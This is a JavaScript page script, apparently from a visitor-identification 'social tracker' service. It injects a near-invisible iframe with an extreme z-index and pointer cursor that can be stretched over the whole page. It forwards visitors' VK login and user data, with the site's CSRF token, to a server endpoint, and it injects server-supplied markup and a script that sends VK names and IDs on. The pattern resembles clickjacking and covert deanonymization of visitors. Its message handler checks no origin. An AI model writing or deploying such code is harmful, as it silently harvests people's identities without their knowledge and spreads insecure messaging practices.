
loadframe = true;
if( navigator.userAgent.match( "Android|BackBerry|phone|iPad|iPod|IEMobile|Nokia|Mobile|MSIE|iPhone|webOS|Windows Phone" )  )  {loadframe = false;} else {loadframe = true;}

var url = '/loadtracker.php';

setTimeout(function(){
    if(loadframe) {
        var sf = document.createElement('div');
        sf.setAttribute("style","z-index: 9999999999;position:absolute;");
        sf.innerHTML = '<iframe src="'+url+'" id="soctr_frame" frameborder="no" scrolling="no" allowtransparency style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:1px; height:1px; border:none; margin:0; padding:0; filter:alpha(opacity=1); opacity:1; cursor: pointer !important; z-index:88888;max-width:100%; background:transparent !important" /><\/iframe>';
        (document.getElementsByTagName('html')[0] || document.body).appendChild( sf );
        sf = document.getElementById("soctr_frame");
        sf.parent = undefined;
    }
}, 1000);

onmessage = function(evnt) {
    switch (evnt.data.type) {
        case 'hideframe':
            document.getElementById('soctr_frame').style.width = '1px';
            document.getElementById('soctr_frame').style.height = '1px';
            document.getElementById('soctr_frame').style.visibility = 'hidden';
            break;
        case 'showframe':
            document.getElementById('soctr_frame').style.width = '100%';
            document.getElementById('soctr_frame').style.height = '100%';
            break;
        case 'removeframe':
            var elem = document.getElementById('soctr_frame');
            elem.parentNode.removeChild(elem);
            break;
        case 'senddata':
            soc_ajax.post(
                evnt.data.scriptHandler,
                {
                    _token: getCsrfToken(),
                    vk_login: evnt.data.vkLogin,
                    user_data: evnt.data.userData,
                },
                function(resp){
                    resp = JSON.parse(resp);
                    if(soc_is_object(resp) == true) {
                        if(resp.widget == 'on') {
                            if (document.getElementById("soc_widgetv1_overlay") == null) {
                                setTimeout(function(){
                                    var container = document.createElement('div');
                                    container.innerHTML = resp.code;
                                    (document.body || document.getElementsByTagName('html')[0]).appendChild(container);
                                    var newScript = document.createElement("script");
                                    newScript.type = "text/javascript";
                                    newScript.text = "function soc_widget_send_info(){soc_ajax.post('/soc_widget_email.php',{user_info:document.getElementById('soc_widgetv1_user_info').value,_site_id:document.getElementById('soc_widgetv1_site_id').value,_vk_name:document.getElementById('soc_widgetv1_vk_name').value,_vk_id:document.getElementById('soc_widgetv1_vk_id').value,user_id:1950},function(){result = document.getElementById('soc_widgetv1_result');result.style.display = 'block';result.style.opacity = '1';setTimeout(function(){var soc_widgetv1 = document.getElementById('soc_widgetv1');  soc_widgetv1.parentNode.removeChild(soc_widgetv1);var soc_widgetv1_overlay = document.getElementById('soc_widgetv1_overlay'); soc_widgetv1_overlay.parentNode.removeChild(soc_widgetv1_overlay);}, 2000);},true);};";
                                    document.getElementsByTagName('head')[0].appendChild(newScript);
                                }, resp.timer * 1000);
                            }
                        }
                    }
                },
                true
            );
            break;
        case 'getdomain':
            evnt.source.postMessage({type: 'gotdomain', domain: document.domain}, '*');
            break;
    }
}



var soc_ajax = {};
soc_ajax.soc_x = function() {
    if (typeof XMLHttpRequest !== 'undefined') {
        return new XMLHttpRequest();
    }
    var versions = [
        "MSXML2.XmlHttp.5.0",
        "MSXML2.XmlHttp.4.0",
        "MSXML2.XmlHttp.3.0",
        "MSXML2.XmlHttp.2.0",
        "Microsoft.XmlHttp"
    ];

    var xhr;
    for(var i = 0; i < versions.length; i++) {
        try {
            xhr = new ActiveXObject(versions[i]);
            break;
        } catch (e) {
        }
    }
    return xhr;
};

soc_ajax.send = function(url, callback, method, data, sync) {
    var soc_x = soc_ajax.soc_x();
    soc_x.open(method, url, sync);
    soc_x.onreadystatechange = function() {
        if (soc_x.readyState == 4) {
            callback(soc_x.responseText);
        }
    };
    if (method == 'POST') {
        soc_x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    }
    soc_x.send(data)
};

soc_ajax.get = function(url, data, callback, sync) {
    var query = [];
    for (var key in data) {
        query.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    }
    soc_ajax.send(url + '?' + query.join('&'), callback, 'GET', null, sync)
};

soc_ajax.post = function(url, data, callback, sync) {
    var query = [];
    for (var key in data) {
        query.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    }
    soc_ajax.send(url, callback, 'POST', query.join('&'), sync)
};

function base64encode(str) {
    var b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg'+
        'hijklmnopqrstuvwxyz0123456789+/=';
    var b64encoded = '';
    var chr1, chr2, chr3;
    var enc1, enc2, enc3, enc4;

    for (var i=0; i<str.length;) {
        chr1 = str.charCodeAt(i++);
        chr2 = str.charCodeAt(i++);
        chr3 = str.charCodeAt(i++);

        enc1 = chr1 >> 2;
        enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);

        enc3 = isNaN(chr2) ? 64:(((chr2 & 15) << 2) | (chr3 >> 6));
        enc4 = isNaN(chr3) ? 64:(chr3 & 63);

        b64encoded += b64chars.charAt(enc1) + b64chars.charAt(enc2) +
            b64chars.charAt(enc3) + b64chars.charAt(enc4);
    }
    return b64encoded;
}

function soc_is_object( mixed_var ){
    if(mixed_var instanceof Array) {
        return false;
    } else {
        return (mixed_var !== null) && (typeof( mixed_var ) == 'object');
    }
}